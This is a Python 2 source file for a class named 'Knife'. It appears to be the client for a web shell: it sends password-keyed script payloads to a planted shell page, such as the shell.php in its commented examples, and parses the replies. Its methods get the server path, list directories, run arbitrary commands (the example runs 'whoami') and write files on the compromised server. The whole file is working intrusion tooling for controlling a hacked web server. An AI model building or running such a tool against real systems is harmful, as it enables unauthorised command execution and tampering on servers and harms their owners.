import requests
from json import JSONDecoder, loads
import re
from lib.scriptLib import scriptlibs, filterString

# res = requests.get("http://127.0.0.1/test.php")
class Knife(object):

    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    def __init__(self, host, password, script="php"):
        self.host = host
        self.password = password
        self.script = script

    def _get_script(self, type="abs", **kwargs):
        return scriptlibs(self.password, **kwargs)[self.script][type]

    def _get_Base(self, type=None, **kwargs):
        if not type:
            return

        get_script_data = self._get_script(type, **kwargs)
        # print get_script_data
        try:
            response = requests.post(self.host, data=get_script_data, headers=self.headers)
        except requests.ConnectionError,e:
            return {str(e): "0"}

        # print filterString(response.content)
        m = re.search(r'-l>(.*?)<l-', '%s'%filterString(response.content))
        # print m.group(1)
        if m:
            return loads(m.group(1), strict=False)
            # return
        return {"FalseCode0": "0"}

    def Get_Absolute_Path(self):
        return self._get_Base('abs')

    def Get_Path_File(self, path=None):
        if not path:
            return
        return self._get_Base('listdir', path=path)

    def Get_Cmd_Ret(self, command=None):
        if not command:
            return
        return self._get_Base('command', command=command)

    def Get_Write_File(self, path=None, context=None):
        if not path and not context:
            return
        return self._get_Base('write', path=path, content=context)
# #
# b = Knife("http://127.0.0.1/shell.php", 'c', "php")
# print b.Get_Write_File('D://phpStudy//WWW//testerssad.txt', context='test')
# print b.Get_Cmd_Ret("whoami")